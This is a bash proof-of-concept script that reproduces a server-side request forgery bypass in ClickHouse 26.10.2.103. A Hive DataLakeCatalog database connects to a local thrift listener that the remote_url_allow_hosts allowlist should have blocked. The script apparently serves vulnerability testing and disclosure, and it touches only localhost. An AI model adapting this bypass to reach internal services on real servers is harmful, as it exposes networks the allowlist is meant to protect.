#!/usr/bin/env bash
# E2E: Hive DataLakeCatalog ignores remote_url_allow_hosts (ClickHouse 26.10.2.103)
# Harmless synthetic thrift URL to local listener only.
set -euo pipefail
CH_BIN="${CH_BIN:-}"
if [[ -z "$CH_BIN" ]]; then
  for c in \
    "$(cd "$(dirname "$0")/.." && pwd)/r22-clickhouse-definer-interserver/cluster/opt/clickhouse-common-static-26.10.2.103/usr/bin/clickhouse" \
    /usr/bin/clickhouse; do
    [[ -x "$c" ]] && CH_BIN=$c && break
  done
fi
[[ -x "${CH_BIN:-}" ]] || { echo "Set CH_BIN to clickhouse 26.10.2.103 binary"; exit 1; }

ROOT=$(mktemp -d /tmp/ch-hive-ssrf-XXXX)
TCP_PORT=$(python3 -c 'import socket;s=socket.socket();s.bind(("127.0.0.1",0));print(s.getsockname()[1]);s.close()')
HTTP_PORT=$(python3 -c 'import socket;s=socket.socket();s.bind(("127.0.0.1",0));print(s.getsockname()[1]);s.close()')
LISTEN_PORT=$(python3 -c 'import socket;s=socket.socket();s.bind(("127.0.0.1",0));print(s.getsockname()[1]);s.close()')

cleanup() {
  kill $(cat "$ROOT/server.pid" 2>/dev/null) 2>/dev/null || true
  kill $(cat "$ROOT/listener.pid" 2>/dev/null) 2>/dev/null || true
  rm -rf "$ROOT"
}
trap cleanup EXIT
mkdir -p "$ROOT"/{data,tmp,user_files,format_schemas}

cat > "$ROOT/users.xml" <<'EOF'
<clickhouse>
  <profiles><default></default></profiles>
  <users><default><password></password><networks><ip>::/0</ip></networks><profile>default</profile><quota>default</quota></default></users>
  <quotas><default></default></quotas>
</clickhouse>
EOF

cat > "$ROOT/config.xml" <<EOF
<clickhouse>
  <logger><level>error</level><console>1</console></logger>
  <http_port>${HTTP_PORT}</http_port>
  <tcp_port>${TCP_PORT}</tcp_port>
  <path>${ROOT}/data/</path>
  <tmp_path>${ROOT}/tmp/</tmp_path>
  <user_files_path>${ROOT}/user_files/</user_files_path>
  <format_schema_path>${ROOT}/format_schemas/</format_schema_path>
  <user_directories><users_xml><path>${ROOT}/users.xml</path></users_xml></user_directories>
  <remote_url_allow_hosts>
    <host_regexp>.*\\.allowed\\.example</host_regexp>
  </remote_url_allow_hosts>
</clickhouse>
EOF

"$CH_BIN" server --config-file="$ROOT/config.xml" >"$ROOT/server.log" 2>&1 &
echo $! >"$ROOT/server.pid"
ok=0
for i in $(seq 1 80); do
  if "$CH_BIN" client --port "$TCP_PORT" -q "SELECT 1" >/dev/null 2>&1; then ok=1; break; fi
  sleep 0.15
done
[[ $ok -eq 1 ]] || { echo "server failed to start"; tail -50 "$ROOT/server.log"; exit 1; }

echo "[NEG] url() to 127.0.0.1 must be UNACCEPTABLE_URL"
neg=$("$CH_BIN" client --port "$TCP_PORT" -q "SELECT * FROM url('http://127.0.0.1:9/x','CSV','a String')" 2>&1 || true)
echo "$neg" | grep -q UNACCEPTABLE_URL || { echo "FAIL neg: $neg"; exit 2; }
echo "  OK: allowlist enforced for url()"

python3 - "$ROOT" "$LISTEN_PORT" <<'PY' &
import socket,sys,os
root,port=sys.argv[1],int(sys.argv[2])
s=socket.socket(); s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.bind(('127.0.0.1',port)); s.listen(5); s.settimeout(30)
open(root+'/ready','w').write('1')
open(root+'/listener.pid','w').write(str(os.getpid()))
try:
  c,a=s.accept(); open(root+'/accept','w').write(repr(a)); c.close()
except Exception as e:
  open(root+'/accept','w').write('NONE '+str(e))
finally:
  s.close()
PY
for i in $(seq 1 50); do [[ -f $ROOT/ready ]] && break; sleep 0.05; done

echo "[EXP] CREATE DataLakeCatalog Hive thrift://127.0.0.1:${LISTEN_PORT} (host NOT in allowlist)"
"$CH_BIN" client --port "$TCP_PORT" --multiquery -q "
SET allow_experimental_database_hms_catalog=1;
CREATE DATABASE ssrf_hive ENGINE = DataLakeCatalog('thrift://127.0.0.1:${LISTEN_PORT}') SETTINGS catalog_type='hive', warehouse='synthetic_wh';
SELECT name FROM system.databases WHERE name='ssrf_hive';
"
sleep 0.5
echo "[EXP] listener accept: $(cat "$ROOT/accept" 2>/dev/null || echo missing)"
grep -q "127.0.0.1" "$ROOT/accept" && echo "PASS: TCP connect reached listener despite remote_url_allow_hosts" || { echo FAIL; exit 3; }
